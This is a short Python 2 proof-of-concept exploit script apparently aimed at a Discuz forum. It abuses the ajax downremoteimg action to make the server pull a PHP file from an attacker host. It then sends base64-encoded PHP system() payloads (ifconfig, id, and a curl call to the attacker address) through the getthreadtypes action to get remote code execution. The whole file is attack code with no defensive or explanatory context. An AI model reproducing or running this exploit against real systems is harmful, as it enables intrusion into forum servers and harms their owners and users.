import requests
import time
import base64

if __name__=="__main__":
    ip="192.168.49.148"
    attack_ip="http://192.168.49.1/301.php"
    payload="system('curl http://192.168.49.1/1.txt');"
    session_i=requests.session()
    payload="system('ifconfig');"
    #payload="system('id');"
    poc1="http://{0}:8011/forum.php?mod=ajax&action=downremoteimg&message=[img=1,1]{1}?.jpg[/img]".format(ip,attack_ip)
    print poc1
    poc2="http://{0}:8011/forum.php?mod=ajax&inajax=yes&action=getthreadtypes&x={1}".format(ip,base64.b64encode(payload))
    print poc2
    try:
        session_i.get(poc1,timeout=6)
        #time.sleep(240)

    except Exception,e:
        #print str(e)
        pass
    print "============================"
    sp = session_i.get(poc2, timeout=5)
    print sp.content
    print "12321"
